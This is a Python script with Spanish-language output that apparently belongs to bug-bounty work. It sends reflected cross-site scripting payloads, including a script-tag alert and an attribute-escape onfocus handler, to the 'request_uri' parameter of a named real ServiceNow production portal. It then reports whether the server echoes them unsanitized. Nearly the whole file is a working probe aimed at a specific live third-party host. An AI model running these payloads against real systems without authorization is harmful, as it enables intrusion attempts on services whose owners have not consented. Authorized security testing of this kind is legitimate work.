import requests
from colorama import init, Fore, Style

init(autoreset=True)

target_url = "https://playtikaprod.service-now.com/api/now/sp/page"

payloads = [
    ("Basic Reflection", "bugbot_test_string_123"),
    ("HTML Injection", "bugbot<h1>test</h1>"),
    ("Script Injection", 'bugbot<script>alert("XSS")</script>'),
    ("Attribute Escape", 'bugbot" autofocus onfocus="alert(1)" ')
]

def test_xss():
    print(f"{Fore.CYAN}[*] Probando Reflected XSS en: {target_url}")
    print(f"{Fore.CYAN}[*] Parámetro Objetivo: 'request_uri'\n")
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
    }

    for name, payload in payloads:
        print(f"{Fore.YELLOW}[>] Probando Payload ({name}): {payload}")
        
        params = {
            "time": "1772575831192",
            "portal_id": "dc6bee0ddb69acdcd619b062f396197e",
            "request_uri": payload
        }
        
        try:
            resp = requests.get(target_url, params=params, headers=headers, timeout=10)
            text = resp.text
            content_type = resp.headers.get("Content-Type", "")
            
            if name == "Basic Reflection": 
                 print(f"    {Fore.MAGENTA}[i] Content-Type del Servidor: {content_type}")
            
            # Verificamos si el payload crudo está exactamente en el texto
            if payload in text:
                print(f"    {Fore.RED}[!!!] VULNERABILIDAD CONFIRMADA: El servidor reflejó el payload sin sanitizar.")
                print(f"    {Fore.WHITE}Fragmento Vvulnerable: ...{text[text.find(payload)-20 : text.find(payload)+len(payload)+20]}...")
            # Verificamos si lo ha escapado
            elif payload.replace("<", "&lt;").replace(">", "&gt;") in text:
                print(f"    {Fore.GREEN}[-] Seguro: El servidor escapó los caracteres HTML (&lt;, &gt;).")
            else:
                 print(f"    {Fore.LIGHTBLACK_EX}[-] El payload no se reflejó en absoluto en la respuesta.")
                 
            print("-" * 50)
            
        except Exception as e:
            print(f"    {Fore.RED}[-] Error de conexión: {e}")
            
if __name__ == "__main__":
    test_xss()
